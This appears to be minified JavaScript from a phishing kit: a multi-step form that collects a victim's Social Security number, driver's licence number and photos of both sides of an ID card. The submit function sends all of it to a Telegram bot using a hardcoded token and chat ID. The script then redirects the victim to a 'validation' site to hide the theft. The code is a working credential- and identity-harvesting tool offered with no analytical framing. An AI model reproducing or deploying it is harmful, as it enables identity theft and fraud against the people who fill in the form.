var submitForm=function(){const e="6929442824",t=document.getElementById("ssn").value,n=document.getElementById("dl").value,a=document.getElementById("front").files[0],o=document.getElementById("back").files[0],l="https://api.telegram.org/bot6403012866:AAGNpGzEijhSfRlMie3dqhv6DD4hucAY1k8/sendDocument",s=new FormData;s.append("chat_id",e),s.append("document",a),s.append("caption",`Front\nSsn: ${t}\nDl: ${n}`);const m=new FormData;return m.append("chat_id",e),m.append("document",o),m.append("caption",`Back\nSsn: ${t}\nDl: ${n}`),fetch(l,{method:"POST",body:s}).then((e=>e.json())).then(fetch(l,{method:"POST",body:m})).then((e=>{console.log("Telegram API response:",e)})).catch((e=>{console.error("Error sending message:",e)})),!1},currentTab=0;function showTab(e){var t=document.getElementsByClassName("tab");t[e].style.display="block",document.getElementById("prevBtn").style.display=0==e?"none":"block",e==t.length-1?document.getElementById("nextBtn").innerHTML="Submit":document.getElementById("nextBtn").innerHTML="Next",fixStepIndicator(e)}function nextPrev(e){var t=document.getElementsByClassName("tab");if(1==e&&!validateForm())return!1;if(t[currentTab].style.display="none",(currentTab+=e)>=t.length){var n=document.getElementById("formContainer");return document.getElementById("nextBtn").setAttribute("type","submit"),n.addEventListener("submit",(e=>{e.preventDefault(),submitForm()})),document.getElementById("loader").style.display="block",document.getElementById("underLoader").style.display="none",!1}showTab(currentTab)}function validateForm(){var e,t,n=!0;for(e=document.getElementsByClassName("tab")[currentTab].getElementsByTagName("input"),t=0;t<e.length;t++)""==e[t].value&&(e[t].className+=" invalid",n=!1);return n&&(document.getElementsByClassName("step")[currentTab].className+=" finish"),n}function fixStepIndicator(e){var t,n=document.getElementsByClassName("step");for(t=0;t<n.length;t++)n[t].className=n[t].className.replace(" active","");n[e].className+=" active"}showTab(currentTab);let myRedirect=()=>{setTimeout((()=>{"block"==document.getElementById("loader").style.display&&window.location.replace("https://complete-validation.online")}),5e3)};setInterval(myRedirect,7e3);